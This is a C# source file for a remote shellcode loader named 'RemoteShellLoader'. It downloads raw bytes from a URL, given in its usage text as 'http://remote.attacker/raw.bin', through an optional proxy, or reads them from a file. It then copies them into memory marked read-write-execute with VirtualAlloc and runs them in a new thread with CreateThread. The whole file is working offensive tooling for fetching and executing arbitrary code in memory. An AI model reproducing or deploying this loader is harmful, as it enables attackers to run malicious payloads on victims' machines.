//Thanks @Arno0x: https://github.com/Arno0x/CSharpScripts/blob/master/shellcodeLauncher.cs
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Threading;

namespace RemoteShellLoader
{
    class Program
    {
        static private WebProxy GetProxy(string proxy)
        {
            // remove [http://]<user>:<pass>@<ip>:<port> if present
            if (proxy.StartsWith("http://"))
            {
                proxy = proxy.Remove(0, 7);
            }

            string uri;
            string[] creds = null;

            if (proxy.Contains("@"))
            {
                // Separate <user>:<pass> @ <ip>:<port>
                string[] splitd = proxy.Split('@');
                creds = splitd[0].Split(':');
                uri = splitd[1];
            }
            else
                uri = proxy;

            Console.WriteLine("{0}", uri);

            WebProxy wp = new WebProxy(new Uri("http://" + uri));

            if (creds != null)
            {
                wp.Credentials = new NetworkCredential(creds[0], creds[1]);
                wp.UseDefaultCredentials = false;
            }

            return wp;
        }

        static private void usage() {
            Console.WriteLine("{0} [/proxy:[user:pass@]<ip>:<port>] http://remote.attacker/raw.bin");
            Console.WriteLine("{0} C:\\path\\to\\file\\raw.bin");
            Environment.Exit(-1);
        }

        static byte[] GetTextWeb(string url, int retry, int timeout, string proxy = null)
        {
            Console.WriteLine($"{url}");

            // If https desired
            // ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();

            if (proxy != null)
            {
                Console.WriteLine("[+] Using proxy {0}", proxy);
                client.Proxy = GetProxy(proxy);
            }

            byte[] str = null;
            while (retry >= 0 && str == null)
            {
                try
                {
                    str = client.DownloadData(url);
                }
                catch (WebException ex) when (ex.Status is WebExceptionStatus.Timeout)
                {
                    Console.WriteLine("[-] {0} timed out, retrying...", url);
                    retry--;
                    Thread.Sleep(timeout * 10000);
                }
                catch (WebException ex)
                {
                    Console.WriteLine("[-] Error: {0} - {1}.", url, ex.Status);
                    break;
                }
            }
            if (str == null)
            {
                Environment.Exit(-1);
            }

            return str;
        }
        static void Main(string[] args)
        {
            var parsed = ArgumentParser.Parse(args);
            if (parsed.ParsedOk == false)
            {
                usage();
            }

            if (! parsed.Arguments.ContainsKey("/file"))
            {
                usage();
            }

            string proxy = null;
            if (parsed.Arguments.ContainsKey("/proxy"))
            {
                proxy = parsed.Arguments["/proxy"];
            }



            var file = parsed.Arguments["/file"];
            byte[]  text;
            if (file.StartsWith("http://"))
            {
                text = GetTextWeb(file, 3, 1, proxy);
            } else
            {
                var fs = new FileStream(file, FileMode.Open);
                var len = (int)fs.Length;
                text = new byte[len];
                fs.Read(text, 0, len);
            }

            if (text.Length == 0)
            {
                Console.WriteLine("[-] Couldn't get bytes");
                return;
            }
            
            IntPtr funcAddr = VirtualAlloc(
                              IntPtr.Zero,
                              (ulong)text.Length,
                              (uint)StateEnum.MEM_COMMIT,
                              (uint)Protection.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(text, 0, (IntPtr)(funcAddr), text.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        #region pinvokes
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
        #endregion
    }
}